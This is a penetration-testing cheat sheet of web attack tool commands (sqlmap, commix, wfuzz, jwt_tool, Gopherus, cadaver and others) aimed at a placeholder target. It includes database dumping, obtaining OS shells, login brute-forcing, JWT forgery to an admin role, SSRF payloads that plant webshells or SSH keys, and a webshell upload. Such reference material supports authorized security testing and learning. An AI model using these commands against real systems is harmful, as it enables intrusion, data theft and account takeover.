# Web Exploitation

_16 tool commands_

### SQLMap  `sqlmap`
_Automated SQL injection tool_

**Step 0**
> Perform SQL injection testing on a URL
```
sqlmap -u "http://target.com/page?id=1"
```
**Syntax breakdown:**
- `sqlmap` — SQLMap tool _command_
- `-u` — Specify the target URL _parameter_

**Step 0**
> Test only a specific parameter
```
sqlmap -u "http://target.com/page?id=1&name=test" -p id
```
**Syntax breakdown:**
- `-p` — Specify the parameter to test _parameter_

**Step 0**
> Test a POST request
```
sqlmap -u "http://target.com/login" --data="user=admin&pass=123"
```
**Syntax breakdown:**
- `--data=` — POST data _parameter_

**Step 0**
> Authenticate using a cookie
```
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=xxx"
```
**Syntax breakdown:**
- `--cookie=` — Set the cookie _parameter_

**Step 0**
> Specify the backend database type
```
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```
**Syntax breakdown:**
- `--dbms=` — Database type (mysql, mssql, oracle, etc.) _parameter_

**Step 0**
> Retrieve all database names
```
sqlmap -u "http://target.com/page?id=1" --dbs
```
**Syntax breakdown:**
- `--dbs` — Enumerate databases _parameter_

**Step 0**
> Get the tables of a specified database
```
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
```
**Syntax breakdown:**
- `-D` — Specify the database _parameter_
- `--tables` — Enumerate tables _parameter_

**Step 0**
> Get the columns of a specified table
```
sqlmap -u "http://target.com/page?id=1" -D db -T table --columns
```
**Syntax breakdown:**
- `-T` — Specify the table _parameter_
- `--columns` — Enumerate columns _parameter_

**Step 0**
> Extract data from specified columns
```
sqlmap -u "http://target.com/page?id=1" -D db -T table -C col1,col2 --dump
```
**Syntax breakdown:**
- `-C` — Specify columns _parameter_
- `--dump` — Extract data _parameter_

**Step 0**
> Attempt to obtain an OS shell
```
sqlmap -u "http://target.com/page?id=1" --os-shell
```
**Syntax breakdown:**
- `--os-shell` — Obtain an interactive OS shell _parameter_

**Step 0**
> Send requests through a proxy
```
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
```
**Syntax breakdown:**
- `--proxy=` — Set the proxy server _parameter_

**Step 0**
> Specify the injection technique type
```
sqlmap -u "http://target.com/page?id=1" --technique=BEUST
```
**Syntax breakdown:**
- `--technique=` — B=boolean-based blind, E=error-based, U=union query, S=stacked queries, T=time-based blind _parameter_

**Step 0**
> Set the scan level and risk level
```
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```
**Syntax breakdown:**
- `--level=` — Scan level (1-5), higher is more thorough _parameter_
- `--risk=` — Risk level (1-3), higher is more risky _parameter_

---

### Burp Suite  `burpsuite`
_Web security testing platform_

**Step 0**
> Configure the proxy listener
```
Proxy -> Options -> Proxy Listeners -> Add -> Port 8080
```

**Step 0**
> Enable request interception
```
Proxy -> Intercept -> Intercept is on
```

**Step 0**
> Send request to Repeater
```
Right-click -> Send to Repeater (Ctrl+R)
```

**Step 0**
> Send request to Intruder
```
Right-click -> Send to Intruder (Ctrl+I)
```

**Step 0**
> The four attack types explained
```
Sniper: single payload
Battering ram: same payload
Pitchfork: multiple payloads in parallel
Cluster bomb: multiple payloads combined
```

**Step 0**
> Start an active scan
```
Dashboard -> New Scan -> select target URL
```

**Step 0**
> Install a BApp extension
```
Extender -> BApp Store -> select extension -> Install
```

**Step 0**
> Copy the request contents
```
Right-click -> Copy to clipboard -> Request
```

---

### FFUF  `ffuf`
_Fast web fuzzing tool_

**Step 0**
> Basic directory brute-forcing
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt
```

**Step 0**
> Add file extensions
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt
```

**Step 0**
> GET parameter testing
_platform: linux_
```
ffuf -u http://target.com/?param=FUZZ -w wordlist.txt
```

**Step 0**
> POST data testing
_platform: linux_
```
ffuf -u http://target.com -X POST -d "user=FUZZ&pass=test" -w wordlist.txt
```

**Step 0**
> Host header testing
_platform: linux_
```
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt
```

**Step 0**
> Match specific status codes
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302
```

**Step 0**
> Filter specific response sizes
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234
```

**Step 0**
> Recursive directory scan
_platform: linux_
```
ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
```

---

### WFuzz  `wfuzz-tool`
_Web fuzzing tool_

**Step 0**
> Basic directory brute-forcing
_platform: linux_
```
wfuzz -c -w wordlist.txt http://target.com/FUZZ
```

**Step 0**
> Filter out 404 responses
_platform: linux_
```
wfuzz -c -w wordlist.txt --hc 404 http://target.com/FUZZ
```

**Step 0**
> POST data testing
_platform: linux_
```
wfuzz -c -w wordlist.txt -d "user=FUZZ&pass=test" http://target.com/login
```

**Step 0**
> Cookie fuzzing
_platform: linux_
```
wfuzz -c -w wordlist.txt -b "session=FUZZ" http://target.com/
```

**Step 0**
> Host header testing
_platform: linux_
```
wfuzz -c -w wordlist.txt -H "Host: FUZZ.target.com" http://target.com/
```

**Step 0**
> Recursive scan
_platform: linux_
```
wfuzz -c -w wordlist.txt -R 2 http://target.com/FUZZ
```

---

### Nikto  `nikto`
_Web server vulnerability scanner that detects dangerous files, outdated components, and configuration issues_

**Step 0**
> Perform a comprehensive web vulnerability scan on the target
```
nikto -h https://target.com
```
**Syntax breakdown:**
- `nikto` — Web server vulnerability scanner _command_
- `-h` — Target host _parameter_

**Step 0**
> Scan an HTTPS service
```
nikto -h target.com -p 8443 -ssl
```

**Step 0**
> Scan through a Burp proxy
```
nikto -h target.com -useproxy http://127.0.0.1:8080
```

**Step 0**
> Run only specified test plugins
```
nikto -h target.com -Plugins "apache_expect_xss;outdated"
```

**Step 0**
> Output an HTML format report
```
nikto -h target.com -o report.html -Format htm
```

---

### OWASP ZAP  `zap`
_OWASP's official web application security testing platform_

**Step 0**
> Quick automated vulnerability scan
```
zap-cli quick-scan -s all -r https://target.com
# or use the API
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com"
```

**Step 0**
> Scan an API based on an OpenAPI specification
```
zap-api-scan.py -t https://target.com/api/swagger.json -f openapi
```

**Step 0**
> Passive scanning in proxy mode
```
# Configure ZAP as a proxy (default port 8080)
# Browse normally after configuring the browser's proxy
# ZAP automatically performs passive vulnerability detection
```

**Step 0**
> Run a baseline scan using a Docker container
```
docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com -r report.html
```

---

### Arjun  `arjun`
_HTTP parameter discovery tool for finding hidden GET/POST parameters_

**Step 0**
> Discover hidden GET parameters
```
arjun -u https://target.com/page
```
**Syntax breakdown:**
- `arjun` — HTTP parameter discovery tool _command_
- `-u` — Target URL _parameter_

**Step 0**
> Discover hidden parameters of a POST request
```
arjun -u https://target.com/api -m POST --include="Content-Type: application/json"
```

**Step 0**
> Use a custom parameter wordlist
```
arjun -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

**Step 0**
> Batch-scan multiple URLs in stable mode
```
arjun -i urls.txt -o results.json --stable
```

---

### WFuzz  `wfuzz`
_Web application fuzzing tool for brute-forcing parameters, directories, authentication, etc._

**Step 0**
> Directory brute-forcing, hiding 404 responses
```
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt --hc 404 https://target.com/FUZZ
```
**Syntax breakdown:**
- `-c` — Colored output _parameter_
- `-z file,wordlist` — Specify a wordlist file as the payload source _parameter_
- `--hc 404` — Hide 404 responses _parameter_
- `FUZZ` — Payload injection point placeholder _variable_

**Step 0**
> Parameter name fuzzing, hiding empty responses
```
wfuzz -c -z file,params.txt --hh 0 "https://target.com/api?FUZZ=test"
```

**Step 0**
> Dual-wordlist combination login brute-forcing
```
wfuzz -c -z file,users.txt -z file,passwords.txt --hc 403 -d "user=FUZZ&pass=FUZ2Z" https://target.com/login
```

**Step 0**
> Enumerate subdomains via Host header injection
```
wfuzz -c -z file,subs.txt --hc 404 -H "Host: FUZZ.target.com" https://target.com
```

---

### Commix  `commix`
_Automated command injection vulnerability detection and exploitation tool_

**Step 0**
> Automatically detect command injection points
```
commix --url="https://target.com/page?cmd=test"
```
**Syntax breakdown:**
- `commix` — Command injection automation tool _command_
- `--url` — Target URL (with injection point in a parameter) _parameter_

**Step 0**
> Specify a POST parameter for injection testing
```
commix --url="https://target.com/api" --data="host=INJECT_HERE" -p host
```

**Step 0**
> Execute system commands or obtain an interactive shell
```
commix --url="https://target.com/page?ip=test" --os-cmd="id"
commix --url="https://target.com/page?ip=test" --os-shell
```

**Step 0**
> Use encoding bypass and time-based blind injection techniques
```
commix --url="https://target.com/page?cmd=test" --tamper=base64encode --technique=t
```

---

### Dalfox  `dalfox`
_High-performance Go-based XSS vulnerability scanner and parameter analysis tool_

**Step 0**
> Scan a single URL for XSS vulnerabilities
```
dalfox url "https://target.com/search?q=test"
```
**Syntax breakdown:**
- `dalfox` — XSS vulnerability scanner _command_
- `url` — Single-URL scan mode _parameter_

**Step 0**
> Batch scan, output PoC only
```
cat urls.txt | dalfox pipe --silence --only-poc
```

**Step 0**
> Use custom payloads and enable WAF evasion
```
dalfox url "https://target.com/q=test" --custom-payload payloads.txt --waf-evasion
```

**Step 0**
> Use Blind XSS callback detection
```
dalfox url "https://target.com/q=test" --blind https://your-xss-hunter.com
```

---

### XSStrike  `xsstrike`
_Advanced XSS detection tool supporting reflected/stored/DOM-based XSS detection_

**Step 0**
> Scan for reflected XSS
```
python3 xsstrike.py -u "https://target.com/search?q=test"
```

**Step 0**
> Test XSS in a POST parameter
```
python3 xsstrike.py -u "https://target.com/comment" --data "content=test" --method POST
```

**Step 0**
> Use fuzzing mode to discover filtering rules
```
python3 xsstrike.py -u "https://target.com/q=test" --fuzzer
```

**Step 0**
> Crawl all pages to a depth of 3 and test for XSS
```
python3 xsstrike.py -u "https://target.com" --crawl -l 3
```

---

### Gopherus  `gopherus`
_Generates Gopher protocol payloads for SSRF attacks against internal services_

**Step 0**
> Generate a Gopher payload to attack MySQL
```
python2 gopherus.py --exploit mysql
# Enter the SQL query to generate a gopher:// payload
```
**Syntax breakdown:**
- `--exploit mysql` — Specify the target service type _parameter_

**Step 0**
> Generate a Gopher payload to attack Redis
```
python2 gopherus.py --exploit redis
# Can generate payloads to write a webshell / cron job / SSH key, etc.
```

**Step 0**
> Generate a payload to attack PHP-FPM/FastCGI
```
python2 gopherus.py --exploit fastcgi
# Enter the command to execute
```

**Step 0**
> Generate a payload to send email via SMTP
```
python2 gopherus.py --exploit smtp
```

---

### Smuggler  `smuggler`
_HTTP request smuggling vulnerability detection tool_

**Step 0**
> Automatically detect HTTP request smuggling vulnerabilities
```
python3 smuggler.py -u https://target.com
```
**Syntax breakdown:**
- `smuggler.py` — HTTP smuggling detection script _command_

**Step 0**
> Test for CL.TE type request smuggling
```
python3 smuggler.py -u https://target.com -t CL.TE
```

**Step 0**
> Read URLs from standard input for batch testing
```
cat urls.txt | python3 smuggler.py
```

---

### JWT Tool  `jwt-tool`
_JSON Web Token security testing tool supporting forgery/cracking/injection_

**Step 0**
> Parse and display the JWT Header and Payload
```
jwt_tool eyJhbGciOi...
```
**Syntax breakdown:**
- `jwt_tool` — JWT security testing tool _command_

**Step 0**
> Automatically attempt all known JWT attacks
```
jwt_tool -t https://target.com/api -rh "Authorization: Bearer eyJ..." -M at
```

**Step 0**
> Attempt to change the algorithm to none to bypass verification
```
jwt_tool eyJhbGciOi... -X a
```

**Step 0**
> Brute-force the HMAC secret key
```
jwt_tool eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt
```

**Step 0**
> Forge a token using a known secret, changing the role to admin
```
jwt_tool eyJhbGciOi... -S hs256 -p "secret_key" -I -pc role -pv admin
```

---

### GraphQLmap  `graphqlmap`
_GraphQL API penetration testing tool supporting introspection queries and injection_

**Step 0**
> Export the full schema via an introspection query
```
python3 graphqlmap.py -u https://target.com/graphql --method POST -x dump_schema
```

**Step 0**
> Enumerate all available Query/Mutation fields
```
python3 graphqlmap.py -u https://target.com/graphql --method POST -x enum
```

**Step 0**
> Test GraphQL parameters for injection vulnerabilities
```
python3 graphqlmap.py -u https://target.com/graphql --method POST -x nosqli
```

---

### Cadaver  `cadaver`
_WebDAV client tool for testing WebDAV services_

**Step 0**
> Connect to a WebDAV server
_platform: linux_
```
cadaver https://target.com/webdav/
```

**Step 0**
> Upload a webshell or file to a WebDAV directory
_platform: linux_
```
# In the cadaver interactive shell:
put shell.aspx
mput *.txt
```

**Step 0**
> List directory contents and download files
_platform: linux_
```
# cadaver shell:
ls
get config.xml
mget *.bak
```

---
